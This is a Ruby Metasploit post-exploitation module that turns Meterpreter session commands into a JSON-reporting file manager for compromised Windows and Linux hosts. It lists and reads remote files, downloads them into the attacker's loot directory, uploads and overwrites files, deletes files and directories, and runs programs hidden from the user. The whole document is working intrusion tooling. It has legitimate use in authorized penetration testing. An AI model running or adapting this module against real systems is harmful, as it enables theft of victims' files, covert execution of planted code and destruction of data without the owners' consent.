##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
require 'base64'
require 'json'
require 'open-uri'
require 'yajl'

class MetasploitModule < Msf::Post

  def initialize(info = {})
    super(update_info(info,
                      'Name'         => 'file system operation atomic',
                      'Description'  => %q{ This module is an alias of meterpreter commands (show_mount,pwd,ls,upload,download).
sometimes we need to use this func outside msf,so run it as module is comfortable},
                      'License'      => MSF_LICENSE,
                      'Author'       => ['viper'],
                      'Platform'     => ['win', 'linux'],
                      'SessionTypes' => ['meterpreter']
          ))

    register_options(
            [

                    OptEnum.new('OPERATION', [true, 'type of opertaion', 'upload', ['pwd', 'show_mount', 'list', 'upload', 'download', 'create_dir', 'destory_file', 'destory_dir', 'execute', 'cat', 'cd', 'update_file']]),
                    OptString.new('SESSION_DIR', [false, 'sessions dir path (list,upload,destory_dir)',]),
                    OptString.new('SESSION_FILE', [false, 'sessions file path(download,destory_file)',]),
                    OptString.new('MSF_FILE', [false, 'local file path(upload)',]),
                    OptString.new('ARGS', [false, 'args execute file',]),
                    OptString.new('FILE_DATA', [false, 'sessions file context',]),
            ])
  end

  # Run Method for when run command is issued
  def run
    result = { :status => true, :message => nil, :data => nil, :endflag => nil }
    if session.type == "shell"
      result[:status]  = false
      result[:message] = 'Unsupport shell type'
      json             = Yajl::Encoder.encode(result)
      json             = json.encode('UTF-8', :invalid => :replace, :replace => "?")
      print("#{json}")
      return
    end

    operation   = datastore['OPERATION']
    sessiondir  = datastore['SESSION_DIR']
    sessionfile = datastore['SESSION_FILE']
    msffile     = datastore['MSF_FILE']
    args        = datastore['ARGS']
    file_data   = datastore['FILE_DATA']
    if operation == 'upload'
      # if session.platform == "windows"
      #   sessionuploadfile = sessiondir + '\\' + msffile.delete('/\\')
      # else
      #   sessionuploadfile = File.join(sessiondir, msffile.delete('/\\'))
      # end
      msffilepath       = File.join(Msf::Config.loot_directory, msffile.delete('/\\'))
      sessionuploadfile = File.join(sessiondir, msffile.delete('/\\'))
      upload(msffilepath, sessionuploadfile)
    elsif operation == 'download'
      msffile   = File.basename(sessionfile)
      localpath = File.join(Msf::Config.loot_directory, msffile.delete('/\\'))
      download(localpath, sessionfile)
      pub_json_result(true,
                      nil,
                      nil,
                      self.uuid)
    elsif operation == 'list'
      list(sessiondir)
    elsif operation == 'show_mount'
      show_mount
    elsif operation == 'pwd'
      pwd
    elsif operation == 'destory_file'
      destory(sessionfile)
    elsif operation == 'destory_dir'
      destory_dir(sessiondir)
    elsif operation == 'create_dir'
      create_dir(sessiondir)
    elsif operation == 'execute'
      execute(sessionfile, args)
    elsif operation == 'cat'
      cat_file(sessionfile)
    elsif operation == 'cd'
      cd_path(sessiondir)
    elsif operation == 'update_file'
      buf = Rex::Text.decode_base64(file_data)
      client.fs.file.update_file(sessionfile, buf)
      result[:status]  = true
      result[:message] = "update finish"
      json             = Yajl::Encoder.encode(result)
      json             = json.encode('UTF-8', :invalid => :replace, :replace => "?")
      print("#{json}")
    end
  end

  def pwd
    result      = { :status => true, :message => nil, :data => nil, :endflag => nil }
    result_list = []
    pwddir      = client.fs.dir.pwd
    pwddir      = pwddir.gsub(/\\windows\\system32/i, '')

    remotepath = pwddir + ::File::SEPARATOR

    client.fs.dir.entries_with_info(remotepath).each do |p|
      if p['FileName'] != '.' && p['FileName'] != '..'
        one_record          = {}
        one_record['name']  = p['FileName']
        ffstat              = p['StatBuf']
        one_record['mode']  = ffstat ? ffstat.prettymode : '/'
        one_record['size']  = ffstat ? ffstat.size : 0
        one_record['type']  = ffstat ? ffstat.ftype : 'unknown'
        one_record['mtime'] = ffstat ? ffstat.mtime.to_i : 0
        result_list.push(one_record)
      end
    end

    result[:status]  = true
    result[:message] = 'pwd finish'
    result[:data]    = { :path => remotepath.gsub(/\\/, '/'), :entries => result_list }
    json             = Yajl::Encoder.encode(result)
    json             = json.encode('UTF-8', :invalid => :replace, :replace => "?")
    print("#{json}")

  end

  def show_mount
    result      = { :status => true, :message => nil, :data => nil, :endflag => nil }
    result_list = []
    if session.platform == "windows"
      mounts = client.fs.mount.show_mount
      mounts.each do |d|
        result_list.push({
                                 :name        => d[:name],
                                 :mode        => '/',
                                 :size        => d[:free_space],
                                 :mtime       => Time.new.to_i,
                                 :type        => d[:type],
                                 :total_space => d[:total_space],
                                 :free_space  => d[:free_space]
                         })
      end
      result[:status]  = true
      result[:message] = 'show mount finish'
      result[:data]    = { :path => '/', :entries => result_list }
      json             = Yajl::Encoder.encode(result)
      json             = json.encode('UTF-8', :invalid => :replace, :replace => "?")
      print("#{json}")
    else
      client.fs.dir.entries_with_info('/').each do |p|
        if p['FileName'] != '.' && p['FileName'] != '..'
          one_record          = {}
          one_record['name']  = p['FileName']
          ffstat              = p['StatBuf']
          one_record['mode']  = ffstat ? ffstat.prettymode : '/'
          one_record['size']  = ffstat ? ffstat.size : 0
          one_record['type']  = ffstat ? ffstat.ftype : 'unknown'
          one_record['mtime'] = ffstat ? ffstat.mtime.to_i : 0
          result_list.push(one_record)
        end
      end

      result[:status]  = true
      result[:message] = 'show mount finish'
      result[:data]    = { :path => '/', :entries => result_list }
      json             = Yajl::Encoder.encode(result)
      json             = json.encode('UTF-8', :invalid => :replace, :replace => "?")
      print("#{json}")
    end
  end

  def list(remotepath)
    result      = { :status => true, :message => nil, :data => nil, :endflag => nil }
    result_list = []

    if session.platform == "windows" and remotepath == '/'
      mounts = client.fs.mount.show_mount
      mounts.each do |d|
        result_list.push({
                                 :name        => d[:name].gsub(/\\/, '/'),
                                 :mode        => '/',
                                 :size        => d[:free_space],
                                 :mtime       => Time.new.to_i,
                                 :type        => d[:type],
                                 :total_space => d[:total_space],
                                 :free_space  => d[:free_space]
                         })
      end
      result[:status]  = true
      result[:message] = 'List finish'
      result[:data]    = { :path => '/', :entries => result_list }
      json             = Yajl::Encoder.encode(result)
      json             = json.encode('UTF-8', :invalid => :replace, :replace => "?")
      print("#{json}")
      return
    end

    client.fs.dir.entries_with_info(remotepath).each do |p|
      if p['FileName'] != '.' && p['FileName'] != '..'
        one_record          = {}
        one_record['name']  = p['FileName']
        ffstat              = p['StatBuf']
        one_record['mode']  = ffstat ? ffstat.prettymode : '/'
        one_record['size']  = ffstat ? ffstat.size : 0
        one_record['type']  = ffstat ? ffstat.ftype : 'unknown'
        one_record['mtime'] = ffstat ? ffstat.mtime.to_i : 0
        result_list.push(one_record)
      end
    end

    result[:status]  = true
    result[:message] = 'List finish'
    result[:data]    = { :path => remotepath, :entries => result_list }
    json             = Yajl::Encoder.encode(result)
    json             = json.encode('UTF-8', :invalid => :replace, :replace => "?")
    print("#{json}")
  end

  def destory(remotepath)
    result = { :status => true, :message => nil, :data => nil, :endflag => nil }
    begin
      client.fs.file.rm(remotepath)
      result[:status]  = true
      result[:message] = 'remove finish'
      json             = Yajl::Encoder.encode(result)
      json             = json.encode('UTF-8', :invalid => :replace, :replace => "?")
    rescue ::Exception
      result[:status]  = false
      result[:message] = $!
      json             = Yajl::Encoder.encode(result)
      json             = json.encode('UTF-8', :invalid => :replace, :replace => "?")
    end
    print("#{json}")
  end

  def destory_dir(remotepath)
    result = { :status => true, :message => nil, :data => nil, :endflag => nil }
    begin
      dir_path = client.fs.file.expand_path(remotepath)

      client.fs.dir.rmdir(dir_path)

      result[:status]  = true
      result[:message] = 'remove finish'
      json             = Yajl::Encoder.encode(result)
      json             = json.encode('UTF-8', :invalid => :replace, :replace => "?")
    rescue ::Exception
      result[:status]  = false
      result[:message] = $!
      json             = Yajl::Encoder.encode(result)
      json             = json.encode('UTF-8', :invalid => :replace, :replace => "?")
    end
    print("#{json}")
  end

  def create_dir(remotepath)
    res    = true
    result = { :status => true, :message => nil, :data => nil, :endflag => nil }
    begin
      client.fs.dir.mkdir(remotepath)

      res = session.fs.file.stat(remotepath).directory?
      if res
        result[:status]  = true
        result[:message] = 'create dir  finish'
        json             = Yajl::Encoder.encode(result)
        json             = json.encode('UTF-8', :invalid => :replace, :replace => "?")
      else
        result[:status]  = false
        result[:message] = 'create dir  failed'
        json             = Yajl::Encoder.encode(result)
        json             = json.encode('UTF-8', :invalid => :replace, :replace => "?")
      end
    rescue ::Exception
      result[:status]  = false
      result[:message] = $!
      json             = Yajl::Encoder.encode(result)
      json             = json.encode('UTF-8', :invalid => :replace, :replace => "?")
    end
    print("#{json}")

  end

  def upload(localpath, remotepath)
    result = { :status => true, :message => nil, :data => nil, :endflag => nil }
    opts   = {
            :block_size => 256 * 1024,
            :tries      => true,
            :tries_no   => 10,
    }
    client.fs.file.upload_file(remotepath, localpath, opts) do |step, src, dst|
      print_status_redis("#{step.ljust(11)}: #{src} -> #{dst}")
    end
    result[:status]  = true
    result[:message] = "upload finish"
    json             = Yajl::Encoder.encode(result)
    json             = json.encode('UTF-8', :invalid => :replace, :replace => "?")
    pub_json_result(true,
                    nil,
                    nil,
                    self.uuid)
  end

  def download(localpath, remotepath)
    result = { :status => true, :message => nil, :data => nil, :endflag => nil }
    begin
      # Download the remote file to the temporary file
      opts = {
              :block_size => 256 * 1024,
              :tries      => true,
              :tries_no   => 10,
      }

      client.fs.file.download_file(localpath, remotepath, opts) do |step, src, dst|
        print_status_redis("#{step.ljust(11)}: #{src} -> #{dst}")
      end

      # client.fs.file.download_file(localpath, remotepath, opts)
      result[:status]  = true
      result[:message] = 'Download finish'
      json             = Yajl::Encoder.encode(result)
      json             = json.encode('UTF-8', :invalid => :replace, :replace => "?")
      print("#{json}")
    rescue Rex::Post::Meterpreter::RequestError => re
      result = { :status => false, :message => re.to_s, :data => nil, :endflag => nil }
      json   = Yajl::Encoder.encode(result)
      json   = json.encode('UTF-8', :invalid => :replace, :replace => "?")
      print("#{json}")

    end

  end

  def execute(remotepath, args)
    result = { :status => true, :message => nil, :data => nil, :endflag => nil }
    #cmd    = "#{remotepath} #{args}"

    begin
      client.sys.process.execute(remotepath, args, opts = { 'Hidden' => true, 'Subshell' => true })
      result[:status]  = true
      result[:message] = 'Execute finish'
      json             = Yajl::Encoder.encode(result)
      json             = json.encode('UTF-8', :invalid => :replace, :replace => "?")
      print("#{json}")
    rescue Rex::Post::Meterpreter::RequestError => re
      result = { :status => false, :message => re.to_s, :data => nil, :endflag => nil }
      json   = Yajl::Encoder.encode(result)
      json   = json.encode('UTF-8', :invalid => :replace, :replace => "?")
      print("#{json}")
    end
  end

  def cat_file(remotepath)
    result = { :status => true, :message => nil, :data => nil, :endflag => nil }
    if (client.fs.file.stat(remotepath).directory?)
      result = { :status => false, :message => "is a directory", :data => nil, :endflag => nil }
    elsif (client.fs.file.stat(remotepath).size >= 1024 * 100)
      result = { :status => false, :message => "to big", :data => nil, :endflag => nil }
    else
      fd   = client.fs.file.new(remotepath, "rb")
      data = ""
      begin
        until fd.eof?
          data = data + fd.read
        end
        # EOFError is raised if file is empty, do nothing, just catch
      rescue EOFError
      end
      fd.close
      result[:status]  = true
      result[:message] = 'cat finish'
      result[:data]    = Rex::Text.encode_base64(data)
    end
    json = Yajl::Encoder.encode(result)
    json = json.encode('UTF-8', :invalid => :replace, :replace => "?")
    print("#{json}")
  end

  def cd_path(remotepath)
    if (client.fs.file.stat(remotepath).directory?)
      client.fs.dir.chdir(remotepath)
      result = { :status => true, :message => nil, :data => nil, :endflag => nil }
    else
      (client.fs.file.stat(remotepath).size >= 1024 * 100)
      result = { :status => false, :message => "is a file", :data => nil, :endflag => nil }
    end
    json = Yajl::Encoder.encode(result)
    json = json.encode('UTF-8', :invalid => :replace, :replace => "?")
    print("#{json}")
  end
end
